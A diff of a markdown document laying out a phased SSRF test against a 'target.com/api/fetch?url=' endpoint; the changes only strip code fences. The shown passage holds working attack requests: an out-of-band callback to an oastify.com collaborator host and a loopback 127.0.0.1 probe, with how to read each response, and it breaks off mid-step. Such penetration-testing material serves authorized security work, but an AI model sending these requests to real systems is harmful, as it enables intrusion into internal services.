@@ -108,10 +108,9 @@ Here's a structured SSRF test against `target.com/api/fetch?url=` following the 
 ## Phase 1 — Injection Point Confirmed
 
 The target is already identified:
-```
 GET /api/fetch?url=https://example.com HTTP/1.1
 Host: target.com
-```
+
 The feature "retrieves remote content and renders it inline" — meaning this is likely **non-blind SSRF** if exploitable. Response body should reflect fetched content directly.
 
 ---
@@ -119,19 +118,17 @@ The feature "retrieves remote content and renders it inline" — meaning this is
 ## Phase 2 — Baseline Confirmation
 
 **Step 1: OOB callback (confirm the server makes outbound requests)**
-```http
 GET /api/fetch?url=https://YOUR-ID.oastify.com HTTP/1.1
 Host: target.com
-```
+
 - DNS hit only → blind SSRF
 - HTTP hit → full SSRF confirmed
 - No hit → blocked outbound, move to bypasses
 
 **Step 2: Loopback self-request**
-```http
 GET /api/fetch?url=http://127.0.0.1/ HTTP/1.1
 Host: target.com
-```
+
 - `200` with app content → SSRF confirmed, server is fetching localhost
 - `502` / `Connection refused` → server attempted it (SSRF exists, nothing listening on
 ... [truncated]
